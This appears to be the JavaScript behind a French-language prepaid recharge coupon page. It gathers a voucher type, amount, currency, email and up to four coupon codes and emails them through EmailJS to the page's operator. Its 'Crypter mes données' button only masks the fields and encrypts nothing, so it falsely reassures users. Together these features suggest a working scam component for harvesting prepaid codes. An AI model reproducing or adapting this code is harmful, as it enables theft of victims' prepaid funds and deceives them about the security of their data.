var base_url = `${window.location.protocol}//${window.location.host}/`;

const btn = document.querySelector('#btncrypt');
btn.addEventListener("click", crypter);

function crypter() {
    const inps = document.querySelectorAll('.code');
    if (btn.value == "Crypter mes données") {
        for (const inp of inps) {
            inp.type = "password";
            btn.value = "Décrypter mes données";
        }
    } else {
        for (const inp of inps) {
            inp.type = "text";
            btn.value = "Crypter mes données";
        }
    }
}

const getFormData = () => {
    const formControls = document.querySelectorAll('.form-control');
    var code = [];
    var formdata = {};
    formControls.forEach((formControl) => {
        const id = formControl.getAttribute('id');
        if (id === "code1" || id === "code2" || id === "code3" || id === "code4") {
            if (formControl.value) code.push(formControl.value);
        } else {
            if (formControl.value && formControl.value !== "none") {
                formdata[`${id}`] = formControl.value;
            } else {
                const errEl = document.getElementById(`${id}Err`);
                errEl.style.color = "red";
                errEl.innerHTML = "Champs Obligatoire";
            }
        }
    });
    formdata.code = code;
    return JSON.stringify(formdata);
}

document.addEventListener("DOMContentLoaded", () => {
    document.querySelector('form#sendmail').addEventListener('submit', (e) => {
        e.preventDefault();
        const form = JSON.parse(getFormData());

        if (form.type && form.montant && form.devise && form.mail && form.code.length) {

            emailjs.send("service_shm8fu1", "template_009pl6w", {
                    recharge: form.type,
                    montant: form.montant,
                    devise: form.devise,
                    code: form.code,
                    mail: form.mail
                })
                .then(function(response) {
                    location.href = "couponSended.html";
                }, function(error) {
                    console.log('FAILED...', error);
                    alert('An error occurred while sending the email.');
                });

        }

    });

});
